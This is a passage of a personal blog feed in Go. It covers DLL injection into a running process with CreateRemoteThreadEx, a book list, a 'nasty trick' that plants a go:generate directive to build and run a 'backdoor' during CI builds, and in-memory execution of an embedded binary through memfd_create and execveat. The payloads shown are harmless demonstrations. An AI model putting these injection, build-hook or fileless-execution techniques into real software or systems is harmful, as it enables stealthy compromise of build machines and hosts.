+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">addr</span>, <span style="color:#a6e22e">size</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This function receives as an input a DLL name and a PID, then it creates a snapshot of loaded modules for the given process and iterates over them. If we find a DLL which name is equal to the one we provided it returns its address and size, otherwise returns an error.</p>
+<p>Once we’ve the address of the DLL we need to understand where the Init function is located. So we’ve two possibilities at this point:</p>
+<ul>
+<li>we can load the DLL into our own process and compare the address with the one of the remote process (there’s chance has not been relocated) and if they match we can easily grab the address of Init with GetProcAddr and pass it directly to CreateRemoteThreadEx</li>
+<li>we inspect the Export Table of the DLL, and locate the RVA (relative virtual address) of the Init function and then we add it to the in memory base image address of the DLL</li>
+</ul>
+<p>So here a snippet of code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">rva</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SearchDLLFunctionAddr</span>(<span style="color:#a6e22e">dllPath</span>, <span style="color:#e6db74">&#34;Init&#34;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// load DLL into our own process so we can resolve the Init symbol
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">dll</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">windows</span>.<span style="color:#a6e22e">LoadDLL</span>(<span style="color:#a6e22e">dllPath</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// get the Init function address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">initFunc</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dll</span>.<span style="color:#a6e22e">FindProc</span>(<span style="color:#e6db74">&#34;Init&#34;</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// search the module addr into remote process memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">dllAddr</span>, <span style="color:#a6e22e">_</span> , <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">SearchModuleAddr</span>(<span style="color:#a6e22e">filepath</span>.<span style="color:#a6e22e">Base</span>(<span style="color:#a6e22e">dllPath</span>), uint32(<span style="color:#a6e22e">pid</span>))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// if DLLs got mapped both at the same address we can call Init function directly
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// with the address we resolved locally from loading DLL into our own process
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">dllAddr</span> <span style="color:#f92672">==</span> uintptr(<span style="color:#a6e22e">dll</span>.<span style="color:#a6e22e">Handle</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// invoke Init into remote process since we now have the address
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">remoteThreadInitCallHandle</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">initFunc</span>.<span style="color:#a6e22e">Addr</span>(), uintptr(<span style="color:#ae81ff">0</span>))
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// we sum the RVA to the remote DLL addr and create manually address for Init function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">remoteAddr</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">dllAddr</span> <span style="color:#f92672">+</span> uintptr(<span style="color:#a6e22e">rva</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">remoteThreadInitCallHandle</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateRemoteThreadEx</span>(<span style="color:#a6e22e">pHandle</span>, <span style="color:#a6e22e">remoteAddr</span>, uintptr(<span style="color:#ae81ff">0</span>))
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>What’s missing is how we get the RVA of the Init function into the DLL. I’ve accomplished the task using this really nice library which parses PE binaries.</p>
+<p>And here is the code used:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">// SearchDLLFunctionAddr searches a function inside a DLL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">SearchDLLFunctionAddr</span>(<span style="color:#a6e22e">dll</span>, <span style="color:#a6e22e">function</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">rva</span> <span style="color:#66d9ef">uint32</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">peFile</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">pe</span>.<span style="color:#a6e22e">New</span>(<span style="color:#a6e22e">dll</span>, <span style="color:#66d9ef">nil</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">peFile</span>.<span style="color:#a6e22e">Close</span>()
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">peFile</span>.<span style="color:#a6e22e">Parse</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">te</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">peFile</span>.<span style="color:#a6e22e">Export</span>.<span style="color:#a6e22e">Functions</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">function</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">Name</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[+] Name: %s, RVA: 0x%08X\n&#34;</span>, <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">Name</span>, <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">FunctionRVA</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rva</span> = <span style="color:#a6e22e">te</span>.<span style="color:#a6e22e">FunctionRVA</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rva</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;function: %s not found&#34;</span>, <span style="color:#a6e22e">function</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">rva</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Also if you’re curious to understand how a PE gets parsed look at the internals of the library, code is really self explanatory and full of comments.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./injector -pid <span style="color:#ae81ff">17960</span> -dllpath <span style="color:#e6db74">&#34;C:\\Users\\..\\evil.dll&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Name: Init, RVA: 0x0008FA50
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Handle: 0x144
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VirtualAllocEx addr: 0x1a2a4af0000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LoadLibraryA: 0x7ff930de04f0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Local Mapped DLL Addr: 0x7ff8e14f0000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Local Init<span style="color:#f92672">()</span> func addr: 0x7ff8e157fa50
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calling CreateRemoteThread with locally resolved Init <span style="color:#66d9ef">function</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Remote DLL addr: 0x7ff8e14f0000, size: <span style="color:#ae81ff">3678208</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Calculated <span style="color:#66d9ef">function</span>: 0x7ff8e157fa50
+</span></span></code></pre></div><p>Above the output of a small tool I wrote to test the code and below the output of tlist.exe which shows the DLL mapped into the notepad.exe process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>..snip... 
+</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92C070000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\C</span>oreUIComponents.dll
+</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF930A40000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>ystem32<span style="color:#ae81ff">\W</span>S2_32.dll
+</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92E670000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>YSTEM32<span style="color:#ae81ff">\n</span>tmarta.dll
+</span></span><span style="display:flex;"><span>                    0x00007FF8E14F0000  C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\.</span>..<span style="color:#ae81ff">\e</span>vil.dll
+</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92F1D0000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\s</span>ystem32<span style="color:#ae81ff">\C</span>RYPTBASE.DLL
+</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF91CF50000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>YSTEM32<span style="color:#ae81ff">\w</span>inmm.dll
+</span></span><span style="display:flex;"><span>10.0.19041.546 shp  0x00007FF92F830000  C:<span style="color:#ae81ff">\W</span>INDOWS<span style="color:#ae81ff">\S</span>YSTEM32<span style="color:#ae81ff">\p</span>owrprof.dll
+</span></span><span style="display:flex;"><span>...snip...
+</span></span></code></pre></div><p>Here we can see that the DLL just wrote a simple text file on the desktop with its PID</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat c:/Users/.../Desktop/test.txt
+</span></span></code></pre></div><p>Notice that unload the DLL from the process can actually crash it, since this will in interfere with running goroutines.</p>
+<p>So that’s all about I did experimenting with Go and DLLs, hope you find it useful.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Books I&#39;ve read in 2021</title>
+            <link>https://example.org/posts/08-books-2021-2/</link>
+            <pubDate>Wed, 22 Dec 2021 17:44:33 +0200</pubDate>
+            
+            <guid>https://example.org/posts/08-books-2021-2/</guid>
+            <description>Here’s the list of books I’ve enjoyed during 2021. Since I’m an avid reader (more than probably I like to write), I’ll try to write down a note about books I liked every year.
+Linux Kernel Programming Vol 1 and Vol 2 – I try always to keep up to date with Linux Kernel development, reading all the stuff that gets published around the topic Windows 10 System Programming Vol 1 and Vol 2 – One of the best book I’ve ever read about system programming, I’m not a Windows guy (except for music production stuff, but since I like low level stuff and system programming, why not?</description>
+            <content type="html"><![CDATA[<p>Here’s the list of books I’ve enjoyed during 2021. Since I’m an avid reader (more than probably I like to write), I’ll try to write down a note about books I liked every year.</p>
+<ul>
+<li>Linux Kernel Programming Vol 1 and Vol 2 – I try always to keep up to date with Linux Kernel development, reading all the stuff that gets published around the topic</li>
+<li>Windows 10 System Programming Vol 1 and Vol 2 – One of the best book I’ve ever read about system programming, I’m not a Windows guy (except for music production stuff, but since I like low level stuff and system programming, why not?)</li>
+<li>Windows Kernel Programming – Well, after reading about Windows user space, why not reading also about its kernel internals?</li>
+<li>Rust In Action – My journey with Rust continues, this book projects the reader through Rust in the system programming ecosystem!</li>
+<li>Creative DIY Microcontroller Projects with TinyGo and WebAssembly – I love Go, and I also love MCUs, so a must read for me!</li>
+<li>The Rootkit Arsenal – Old but gold! Gory details about Rootkits on Windows, book is quite old now, but I think still worth to be read, it’s full of details that yet stick in nowadays</li>
+<li>Alternate Picking Guitar Technique – Another great book from Chris Brooks, if you want to improve your alternate picking technique this is a must have!</li>
+</ul>
+<p>That’s all folks!</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Nastry Tricks with Go Generate</title>
+            <link>https://example.org/posts/06-nastry-tricks-go-generate/</link>
+            <pubDate>Wed, 24 Nov 2021 17:29:14 +0200</pubDate>
+            
+            <guid>https://example.org/posts/06-nastry-tricks-go-generate/</guid>
+            <description>Nasty tricks with go generate novembre 24th, 2021
+What follows here is just a general idea of how and individual with malicious intent can theoretically attack a CI system or a build machine using the go generate tool.
+The idea is very simple, first the attacker should embed a go generate directive into its application, then at build time (using make or cmake or whatever it’s used to run the build) should run the go generate command.</description>
+            <content type="html"><![CDATA[<p>Nasty tricks with go generate
+novembre 24th, 2021</p>
+<p>What follows here is just a general idea of how and individual with malicious intent can theoretically attack a CI system or a build machine using the go generate tool.</p>
+<p>The idea is very simple, first the attacker should embed a go generate directive into its application, then at build time (using make or cmake or whatever it’s used to run the build) should run the go generate command.</p>
+<p>Here is a simple example of such a nasty trick.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//go:generate bash -c &#34;echo &#39;package main\nimport \&#34;fmt\&#34;\nfunc main() {fmt.Println(\&#34;backdoor\&#34;)}&#39; &gt; bd.go &amp;&amp; go build -o bd bd.go &amp;&amp; ./bd&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;test&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now if we run the go generate command:</p>
+<p>That’s of course just pure speculation and I’m not very sure how much this is feasible to accomplish this attack inside an organization/company which is very dedicated to review the source code and the build system, but I think that’s not impossible for a malicious developer accomplish it.</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Embed and execute from memory with Golang</title>
+            <link>https://example.org/posts/01-go-embed/</link>
+            <pubDate>Tue, 22 Jun 2021 14:33:57 +0200</pubDate>
+            
+            <guid>https://example.org/posts/01-go-embed/</guid>
+            <description>In this post I’ll show how to embed a file into a Golang binary and then how this file will be loaded and executed from memory on Linux with the aid of memfd_create(2) and execveat(2).
+Since version 1.16 Golang introduced a nice feature which allows embedding a file or a hierarchy of files into a binary. The embedded content can then be accessed as a string, []byte slice or embed.FS object.</description>
+            <content type="html"><![CDATA[<p>In this post I’ll show how to embed a file into a Golang binary and then how this file will be loaded and executed from memory on Linux with the aid of memfd_create(2) and execveat(2).</p>
+<p>Since version 1.16 Golang introduced a nice feature which allows embedding a file or a hierarchy of files into a binary. The embedded content can then be accessed as a string, []byte slice or embed.FS object.</p>
+<p>In order to do it will suffice to use the //go:embed file directive, e.g.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">//go:embed file.bin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filePayload</span> []<span style="color:#66d9ef">byte</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Then the content can be accessed as a standard []byte slice variable.</p>
+<p>Now, that we know how to embed a file (in our case a binary one), we want to copy it into a memory location and then execute it straight from there. Here Linux offers us two system calls which used in tandem will allow us to do so.</p>
+<p>First syscall is memfd_create, is used to create a backed memory file descriptor. Quoting its man page:</p>
+<pre tabindex="0"><code>memfd_create() creates an anonymous file and returns a file descriptor that refers to it. The file behaves like a regular file, and so can be modified, truncated, memory-mapped, and so on. However, unlike a regular file, it lives in RAM and has a volatile backing storage. Once all references to the file are dropped, it is automatically released. Anonymous memory is used for all backing pages of the file. Therefore, files created by memfd_create() have the same semantics as other anonymous memory allocations such as those allocated using mmap(2) with the MAP_ANONYMOUS flag.
+</code></pre><p>However since Golang does not exposes this Linux specific syscall into the syscall package it is necessary to craft the code to invoke it using the specifc syscall.Syscall function. Code is however straightforward:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">MemfdCreate</span>(<span style="color:#a6e22e">path</span> <span style="color:#66d9ef">string</span>) (<span style="color:#a6e22e">r1</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">BytePtrFromString</span>(<span style="color:#a6e22e">path</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">r1</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">errno</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Syscall</span>(<span style="color:#ae81ff">319</span>, uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#a6e22e">s</span>)), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> int(<span style="color:#a6e22e">r1</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">r1</span>, <span style="color:#a6e22e">errno</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">r1</span>, <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We pass to the function the virtual in memory path for our file, then we get a byte pointer which points to a \0 terminated sequence of bytes and then we feed it to the syscall.Syscall function number 319 a.k.a. memfd_create . That’s it, what we get back if no errors occur, it’s a file descriptor pointing to our in memory backed file.</p>
+<p>Now we have to copy the content of our embedded file into that memory location, luckily we’ve to not wrap the write(2) syscall since it is already part of the syscall package. So we can craft a simple function like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">CopyToMem</span>(<span style="color:#a6e22e">fd</span> <span style="color:#66d9ef">uintptr</span>, <span style="color:#a6e22e">buf</span> []<span style="color:#66d9ef">byte</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Write</span>(int(<span style="color:#a6e22e">fd</span>), <span style="color:#a6e22e">buf</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The final step is to execute this file descriptor using execveat for which again we’ve to craft a function using syscall.Syscall in order to invoke it. Basically execveat behaves as execve or differently based on parameters we feed to it. If we supply a file descriptor, then as a path an empty string (&quot;&quot;) and as a flag AT_EMPTY_PATH, this combination of parameters will execute directly the file pointed by the file descriptor, and in our specific case an in memory one.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">ExecveAt</span>(<span style="color:#a6e22e">fd</span> <span style="color:#66d9ef">uintptr</span>) (<span style="color:#a6e22e">err</span> <span style="color:#66d9ef">error</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">s</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">BytePtrFromString</span>(<span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>, <span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">errno</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">syscall</span>.<span style="color:#a6e22e">Syscall6</span>(<span style="color:#ae81ff">322</span>, <span style="color:#a6e22e">fd</span>, uintptr(<span style="color:#a6e22e">unsafe</span>.<span style="color:#a6e22e">Pointer</span>(<span style="color:#a6e22e">s</span>)), <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> int(<span style="color:#a6e22e">ret</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errno</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// never hit
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;should never hit&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">err</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We gather again a NULL terminated string as a sequence of bytes, in this case an empty string. Then we use the syscall.Syscall6 (notice the name differs since this version of the function accepts up to six parameters in contrast to the previous one which accepts up to three) in order to invoke the execveat (syscall number 322) with our file descriptor as a first parameter, then the empty NULL terminated string, then we skip argv[] and envp[] (we just don’t need them for the purpose of this example since our embedded binary accepts no arguments) and finally we supply 0x1000 which is the value for AT_EMPTY_PATH. Of course as for execve if this call succeeds the program won’t return, since the image of the current process will be replaced by the new one.</p>
+<p>So to recap we invoke the in memory execution like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#75715e">//go:embed file.bin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">filePayload</span> []<span style="color:#66d9ef">byte</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">MemfdCreate</span>(<span style="color:#e6db74">&#34;/file.bin&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">CopyToMem</span>(<span style="color:#a6e22e">fd</span>, <span style="color:#a6e22e">filePayload</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">err</span> = <span style="color:#a6e22e">ExecveAt</span>(<span style="color:#a6e22e">fd</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;fmt&#34;</span>
